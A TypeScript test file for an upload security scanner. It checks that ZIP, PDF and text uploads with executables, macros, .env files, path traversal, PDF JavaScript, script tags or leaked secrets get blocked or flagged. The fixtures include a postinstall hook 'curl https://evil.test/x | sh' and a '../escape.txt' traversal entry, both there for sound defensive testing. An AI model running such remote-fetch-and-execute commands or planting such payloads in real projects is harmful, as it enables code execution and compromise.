import assert from "node:assert/strict";
import { crc32 } from "node:zlib";
import test from "node:test";

import { PDFDocument, StandardFonts } from "pdf-lib";
import { ZipFile } from "yazl";

import { detectUpload } from "../src/lib/upload-core.ts";
import {
  analyzeUpload,
  canApproveScanStatus,
  isBlockedScanStatus,
} from "../src/lib/upload-security.ts";

const encoder = new TextEncoder();

function bufferFrom(value: string | Uint8Array): Buffer {
  return Buffer.isBuffer(value) ? value : Buffer.from(value);
}

function zip(entries: Array<{ path: string; data: string | Uint8Array }>) {
  return new Promise<Uint8Array>((resolve, reject) => {
    const archive = new ZipFile();

    for (const entry of entries) {
      archive.addBuffer(bufferFrom(entry.data), entry.path);
    }

    archive.end();

    const chunks: Buffer[] = [];
    archive.outputStream.on("data", (chunk: Buffer) => chunks.push(chunk));
    archive.outputStream.on("end", () =>
      resolve(new Uint8Array(Buffer.concat(chunks))),
    );
    archive.outputStream.on("error", reject);
  });
}

/**
 * Small stored-entry ZIP writer used to exercise names that yazl refuses to
 * create, such as `../escape.txt`.
 */
function rawZip(entries: Array<{ path: string; data: string }>): Uint8Array {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const entry of entries) {
    const name = Buffer.from(entry.path, "utf8");
    const data = Buffer.from(entry.data, "utf8");
    const checksum = crc32(data) >>> 0;

    const local = Buffer.alloc(30 + name.length);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0, 6);
    local.writeUInt16LE(0, 8);
    local.writeUInt16LE(0, 10);
    local.writeUInt16LE(0, 12);
    local.writeUInt32LE(checksum, 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(name.length, 26);
    local.writeUInt16LE(0, 28);
    name.copy(local, 30);

    const central = Buffer.alloc(46 + name.length);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(0, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt16LE(0, 12);
    central.writeUInt16LE(0, 14);
    central.writeUInt32LE(checksum, 16);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt16LE(0, 30);
    central.writeUInt16LE(0, 32);
    central.writeUInt16LE(0, 34);
    central.writeUInt16LE(0, 36);
    central.writeUInt32LE((0o100644 << 16) >>> 0, 38);
    central.writeUInt32LE(offset, 42);
    name.copy(central, 46);

    locals.push(local, data);
    centrals.push(central);
    offset += local.length + data.length;
  }

  const centralDirectory = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(0, 4);
  end.writeUInt16LE(0, 6);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(centralDirectory.length, 12);
  end.writeUInt32LE(offset, 16);
  end.writeUInt16LE(0, 20);

  return new Uint8Array(Buffer.concat([...locals, centralDirectory, end]));
}

async function analyze(bytes: Uint8Array, fileName: string) {
  const detected = detectUpload(bytes, fileName);

  assert.ok(detected, `test fixture should be detected: ${fileName}`);

  return analyzeUpload({ bytes, fileName, detected });
}

function findingCodes(report: Awaited<ReturnType<typeof analyze>>) {
  return report.findings.map((finding) => finding.code);
}

test("accepts a clean source ZIP", async () => {
  const bytes = await zip([
    {
      path: "package.json",
      data: JSON.stringify({ name: "demo", scripts: { build: "tsc" } }),
    },
    { path: "src/index.ts", data: "export const answer = 42;\n" },
  ]);

  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "CLEAN");
  assert.deepEqual(report.findings, []);
  assert.equal(report.metadata.entryCount, 2);
});

test("blocks an executable inside a ZIP", async () => {
  const bytes = await zip([{ path: "setup.exe", data: "MZ fake" }]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "BLOCKED");
  assert.ok(findingCodes(report).includes("executable_entry"));
});

test("blocks a macro-enabled Office document inside a ZIP", async () => {
  const bytes = await zip([{ path: "invoice.xlsm", data: "macro" }]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "BLOCKED");
  assert.ok(findingCodes(report).includes("macro_entry"));
});

test("blocks nested archives", async () => {
  const inner = await zip([{ path: "readme.txt", data: "hello" }]);
  const bytes = await zip([{ path: "nested.zip", data: inner }]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "BLOCKED");
  assert.ok(findingCodes(report).includes("nested_archive"));
});

test("blocks a .env file", async () => {
  const bytes = await zip([
    { path: ".env", data: "DATABASE_URL=postgres://secret" },
  ]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "BLOCKED");
  assert.ok(findingCodes(report).includes("env_file"));
});

test("blocks environment-specific .env files but allows the example", async () => {
  const blocked = await analyze(
    await zip([{ path: ".env.production", data: "SECRET=live" }]),
    "demo.zip",
  );
  assert.equal(blocked.status, "BLOCKED");
  assert.ok(findingCodes(blocked).includes("env_file"));

  const allowed = await analyze(
    await zip([{ path: ".env.example", data: "SECRET=replace-me" }]),
    "demo.zip",
  );
  assert.equal(allowed.status, "CLEAN");
});

test("blocks path traversal entries", async () => {
  const bytes = rawZip([
    { path: "../escape.txt", data: "escape" },
    { path: "safe.txt", data: "safe" },
  ]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "BLOCKED");
  assert.ok(findingCodes(report).includes("path_traversal"));
});

test("flags lifecycle scripts in package.json", async () => {
  const bytes = await zip([
    {
      path: "package.json",
      data: JSON.stringify({
        name: "demo",
        scripts: { postinstall: "node setup.js" },
      }),
    },
  ]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "SUSPICIOUS");
  assert.ok(findingCodes(report).includes("package_lifecycle_script"));
  assert.equal(canApproveScanStatus(report.status), true);
});

test("flags remote shell execution in install scripts", async () => {
  const bytes = await zip([
    {
      path: "package.json",
      data: JSON.stringify({
        name: "demo",
        scripts: { postinstall: "curl https://evil.test/x | sh" },
      }),
    },
  ]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "SUSPICIOUS");
  assert.ok(findingCodes(report).includes("package_script_command"));
});

test("flags secrets in text files", async () => {
  const bytes = await zip([
    {
      path: "config.txt",
      data: "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n",
    },
  ]);
  const report = await analyze(bytes, "demo.zip");

  assert.equal(report.status, "SUSPICIOUS");
  assert.ok(findingCodes(report).includes("possible_secret"));
});

test("blocks PDFs with JavaScript", async () => {
  const bytes = encoder.encode(
    "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n2 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\n%%EOF",
  );
  const report = await analyze(bytes, "document.pdf");

  assert.equal(report.status, "BLOCKED");
  assert.ok(findingCodes(report).includes("pdf_javascript"));
  assert.equal(isBlockedScanStatus(report.status), true);
});

test("accepts a clean PDF", async () => {
  const document = await PDFDocument.create();
  const page = document.addPage();
  const font = await document.embedFont(StandardFonts.Helvetica);
  page.drawText("Safe product documentation", { x: 50, y: 700, font });
  const bytes = await document.save();

  const report = await analyze(new Uint8Array(bytes), "document.pdf");

  assert.equal(report.status, "CLEAN");
  assert.equal(report.metadata.pdfPageCount, 1);
});

test("flags active HTML in text uploads", async () => {
  const bytes = encoder.encode("<script>alert('x')</script>\n");
  const report = await analyze(bytes, "notes.md");

  assert.equal(report.status, "SUSPICIOUS");
  assert.ok(findingCodes(report).includes("active_html_content"));
});

test("flags secrets in plain text uploads", async () => {
  const bytes = encoder.encode(
    "-----BEGIN RSA PRIVATE KEY-----\nnot-a-real-key\n",
  );
  const report = await analyze(bytes, "notes.txt");

  assert.equal(report.status, "SUSPICIOUS");
  assert.ok(findingCodes(report).includes("possible_secret"));
});

test("only clean and suspicious scans can be approved", () => {
  assert.equal(canApproveScanStatus("CLEAN"), true);
  assert.equal(canApproveScanStatus("SUSPICIOUS"), true);
  assert.equal(canApproveScanStatus("BLOCKED"), false);
  assert.equal(canApproveScanStatus("ERROR"), false);
  assert.equal(canApproveScanStatus("PENDING"), false);

  assert.equal(isBlockedScanStatus("BLOCKED"), true);
  assert.equal(isBlockedScanStatus("ERROR"), true);
  assert.equal(isBlockedScanStatus("CLEAN"), false);
});
